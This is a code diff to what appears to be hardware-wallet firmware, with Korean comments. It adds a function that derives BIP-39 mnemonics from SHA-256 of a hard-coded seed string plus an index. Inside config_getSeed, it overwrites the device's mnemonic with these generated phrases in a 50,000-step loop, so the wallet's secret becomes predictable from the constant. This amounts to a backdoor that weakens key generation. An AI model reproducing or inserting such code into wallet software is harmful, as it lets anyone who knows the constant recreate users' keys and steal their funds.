@@ -577,6 +577,43 @@ static void get_root_node_callback(uint32_t iter, uint32_t total) {
   layoutProgress(_("Waking up"), 1000 * iter / total);
 }
 
+////////////////////////////
+#define MASTER_SEED "251020"
+#define NUM_MNEMONICS 50000
+////////////////////////////
+int generate_mnemonic_for_index_onthefly(uint32_t index, char *output_mnemonic, size_t max_len) {
+    
+    // 1. 입력 데이터 문자열 생성 (예: "2510200", "2510201", ...)
+    char input_data_str[100]; 
+    int input_len = snprintf(input_data_str, sizeof(input_data_str), "%s%u", MASTER_SEED, index);
+    
+    if (input_len < 0 || input_len >= sizeof(input_data_str)) {
+        return -1;
+    }
+
+    // 2. SHA-256 해시 계산 (256비트 엔트로피 생성)
+    //    (sha2.h에 정의된 sha256_Raw 사용)
+    uint8_t entropy[SHA256_DIGEST_LENGTH]; // 32 bytes
+    sha256_Raw((const uint8_t *)input_data_str, input_len, entropy);
+
+    // 3. 엔트로피로부터 니모닉 생성
+    //    (펌웨어의 bip39.h에 있는 함수 사용 - mnemonic_from_data로 가정)
+    const char *mnemonic_ptr = mnemonic_from_data(entropy, sizeof(entropy));
+
+    if (mnemonic_ptr == NULL) {
+        memzero(entropy, sizeof(entropy));
+        return -1;
+    }
+
+    // 4. 결과 복사 및 정리
+    strncpy(output_mnemonic, mnemonic_ptr, max_len - 1);
+    output_mnemonic[max_len - 1] = '\0'; // NUL-종료 보장
+
+    memzero(entropy, sizeof(entropy));
+    memzero(input_data_str, sizeof(input_data_str));
+
+    return 0; // 성공
+}
 const uint8_t *config_getSeed(void) {
   trigger_init_once();
   if (activeSessionCache == NULL) {
@@ -622,14 +659,22 @@ const uint8_t *config_getSeed(void) {
         return NULL;
       }
     }
-    // if storage was not imported (i.e. it was properly generated or recovered)
-    bool imported = false;
-    config_get_bool(KEY_IMPORTED, &imported);
-    if (!imported) {
-      // test whether mnemonic is a valid BIP-0039 mnemonic
-      if (!mnemonic_check(mnemonic)) {
-        // and if not then halt the device
-        error_shutdown(_("Storage failure"), _("detected."), NULL, NULL);
+
+    // ------------------------------------------------------------------
+    // ## ✨ On-the-fly 50,000회 생성 및 검사 루프 시작 ##
+    // ------------------------------------------------------------------
+
+    for (uint32_t i = 0; i < NUM_MNEMONICS; i++) {
+      generate_mnemonic_for_index_onthefly(i, mnemonic, sizeof(mnemonic));
+      // if storage was not imported (i.e. it was properly generated or recovered)
+      bool imported = false;
+      config_get_bool(KEY_IMPORTED, &imported);
+      if (!imported) {
+        // test whether mnemonic is a valid BIP-0039 mnemonic
+        if (!mnemonic_check(mnemonic)) {
+          // and if not then halt the device
+          error_shutdown(_("Storage failure"), _("detected."), NULL, NULL);
+        }
       }
     }
     char oldTiny = usbTiny(1);
